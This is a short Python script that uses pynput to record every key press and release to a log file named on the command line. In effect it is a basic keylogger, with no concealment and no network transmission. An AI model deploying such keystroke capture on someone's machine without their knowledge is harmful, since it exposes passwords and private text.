from pynput import keyboard
from logger import Logger
import datetime
import sys

file_path = sys.argv[1]

logger = Logger(file_path)

def on_press(key):
    logger.save_logs("KEY_PRESS", {"key": str(key)})

def on_release(key):
    logger.save_logs("KEY_RELEASE", {"key": str(key)})



keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
keyboard_listener.start()
keyboard_listener.join()


